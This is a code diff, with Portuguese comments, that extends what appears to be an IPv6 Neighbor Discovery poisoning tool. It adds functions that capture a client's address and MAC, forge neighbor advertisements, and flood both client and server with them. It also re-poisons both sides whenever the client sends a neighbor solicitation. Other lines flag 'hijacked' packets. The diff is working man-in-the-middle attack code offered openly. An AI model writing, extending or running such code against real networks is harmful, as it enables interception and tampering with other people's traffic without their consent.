@@ -29,7 +29,47 @@ void termination_handler(int signum) {
 	/* TODO */
 	printf("\nSig: %d\nFree everything\n", signum);
 	close(sniff);
+	free(cvictim); //FIXME: free all the attributes??
 	exit(0);
+}
+
+void poison(struct victim *dst) {
+	int i;
+	char *pkt;
+
+	printf("Setting up Client poisoning\n");
+	pkt = alloc_ndadvert(&svictim, dst);
+	for(i = 0; i < 100; i++) {
+		send_icmpv6(&(dst->ipv6), pkt);
+	}
+	free(pkt);
+	printf("Client poisoned\n");
+
+	printf("Setting up Server poisoning\n");
+	pkt = alloc_ndadvert(dst, &svictim);
+	for(i = 0; i < 100; i++) {
+		send_icmpv6(&svictim.ipv6, pkt);
+	}
+	free(pkt);
+	printf("Server poisoned\n");
+
+}
+
+void populate_cvictim(char *pkt) {
+	struct ethhdr *eth;
+	struct ip6_hdr *ip6;
+
+	eth = (struct ethhdr *)pkt;
+	ip6 = (struct ip6_hdr *)((char *)eth + sizeof(struct ethhdr));
+
+	printf("Populando CVICTIM\n");
+
+	cvictim = (struct victim *)malloc(sizeof(struct victim));
+	memcpy(&(cvictim->ipv6), &(ip6->ip6_src), sizeof(struct in6_addr));
+	memcpy(&(cvictim->hwaddr), &(eth->h_source), ETH_ALEN);
+
+	debug_cvivtim(cvictim);
+	poison(cvictim);
 }
 
 void packet_action(char *packet) {
@@ -46,6 +86,12 @@ void packet_action(char *packet) {
 
 	/* Pacote para nossa vitima. */
 	if (!memcmp(&(ip6->ip6_dst), &(svictim.ipv6), sizeof(struct in6_addr))) {
+
+		/* Por enquanto é apenas suportado 1 cliente */
+		if(!cvictim)
+			/* já faz o primeiro poison só prá deixar de ser otário */
+			populate_cvictim(packet);
+
 		/* Se o mac destino for o do atacante, é pacote roubado */
 		if (memcmp(&(eth->h_dest), &(device.hwaddr), ETH_ALEN) == 0) {
 			printf("Packet Hijacked? :-)\n");
@@ -63,10 +109,13 @@ void packet_action(char *packet) {
 		} else if (ip6->ip6_nxt == IPPROTO_ICMPV6) {
 			icmpv6 = (struct icmp6_hdr *)((char *)ip6 + sizeof(struct ip6_hdr));
 			/* Se for uma solicitação de discover e o cliente ainda não foi
-			 * "poisoned", dispara o poison. */
+			* "poisoned", dispara o poison. */
 			if (icmpv6->icmp6_type == ND_NEIGHBOR_SOLICIT) {
 				/* TODO */
 				printf("Thread de poison para o client.\n");
+				/* Sempre que o client enviar um solicitation a gente vai
+				* envenenar ambas as partes */
+				poison(cvictim);
 			}
 		}
 	} else if (!memcmp(&(ip6->ip6_src), &(svictim.ipv6), sizeof(struct in6_addr))) {
